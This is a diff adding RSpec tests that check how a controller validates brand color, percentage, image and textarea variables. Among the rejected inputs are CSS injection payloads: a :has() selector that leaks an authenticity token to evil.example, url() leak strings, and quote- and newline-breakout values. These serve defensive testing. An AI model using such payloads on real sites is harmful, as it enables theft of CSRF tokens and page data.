@@ -392,6 +392,120 @@ describe BrandConfigsController do
         expect(result).not_to include("<script")
       end
     end
+
+    shared_examples_for "a brand variable type" do |variable_name, valid_values, invalid_values|
+      before { user_session(admin) }
+
+      def submit(variable, value)
+        post "create", params: {
+          account_id: @account.id,
+          brand_config: { variables: { variable => value } }
+        }
+      end
+
+      valid_values.each do |description, value|
+        it "accepts #{description}" do
+          submit(variable_name, value)
+          expect(response).to have_http_status(:ok)
+          expect(response.parsed_body["brand_config"]["variables"][variable_name]).to eql(value)
+        end
+      end
+
+      invalid_values.each do |description, value|
+        it "rejects #{description}" do
+          submit(variable_name, value)
+          expect(response).to have_http_status(:bad_request)
+        end
+      end
+    end
+
+    context "color variable processing" do
+      it_behaves_like(
+        "a brand variable type",
+        "ic-brand-primary",
+        {
+          "3-digit hex colors" => "#abc",
+          "4-digit hex colors with alpha" => "#abcd",
+          "6-digit hex colors" => "#A1B2C3",
+          "8-digit hex colors with alpha" => "#11223344",
+        },
+        {
+          ":has() CSS payloads" => "red; } :has(input[name=\"authenticity_token\"][value^=\"a\"]) { background-image: url(https://evil.example/a",
+          "url() payloads" => "url(https://evil.example/leak)",
+          "CSS named colors" => "red",
+          "rgb() color functions" => "rgb(255,0,0)",
+          "hex colors with trailing content" => "#abc;color:red",
+          "5-digit hex (not a valid CSS color)" => "#abcde",
+          "7-digit hex (not a valid CSS color)" => "#abcdef0",
+        }
+      )
+    end
+
+    context "percentage variable processing" do
+      it_behaves_like(
+        "a brand variable type",
+        "ic-brand-watermark-opacity",
+        {
+          "integer percentage values" => "75%",
+          "decimal values without a percent sign" => "0.5",
+          "100% upper bound" => "100%",
+          "zero" => "0",
+        },
+        {
+          "percentage values with CSS payloads" => "50%; background: url(https://evil.example)",
+          "non-numeric percentage values" => "abc",
+          "negative percentage values" => "-1",
+          "values above 100" => "9999999%",
+        }
+      )
+    end
+
+    context "image variable processing" do
+      it_behaves_like(
+        "a brand variable type",
+        "ic-brand-header-image",
+        {
+          "relative image paths" => "/images/logo.png",
+          "https image URLs" => "https://cdn.example.com/logo.png",
+        },
+        {
+          "image URLs containing single quotes" => "logo.png'); background: red; ('",
+          "image URLs containing parentheses" => "evil(payload).png",
+          "image URLs containing newlines" => "logo.png\n} :root { color: red",
+        }
+      )
+    end
+
+    context "textarea variable rendering" do
+      it "does not include textarea-typed variables in the generated brand stylesheet" do
+        user_session(admin)
+        malicious = "Hello; } :has(input) { background-image: url(//evil)"
+        post "create", params: {
+          account_id: @account.id,
+          brand_config: { variables: { "ic-brand-Login-custom-message" => malicious } }
+        }
+        md5 = response.parsed_body["brand_config"]["md5"]
+        css = BrandableCSS.all_brand_variable_values_as_css(BrandConfig.find(md5))
+        expect(css).not_to include("ic-brand-Login-custom-message")
+        expect(css).not_to include("Hello;")
+      end
+    end
+
+    context "unsupported variable types" do
+      it "rejects variables whose schema declares an unknown type" do
+        user_session(admin)
+        allow(BrandableCSS).to receive(:variables_map).and_return(
+          BrandableCSS.variables_map.merge(
+            "ic-brand-primary" => { "variable_name" => "ic-brand-primary", "type" => "exotic" }
+          )
+        )
+        post "create", params: {
+          account_id: @account.id,
+          brand_config: { variables: { "ic-brand-primary" => "anything" } }
+        }
+        expect(response).to have_http_status(:bad_request)
+      end
+    end
   end
 
   describe "#destroy" do
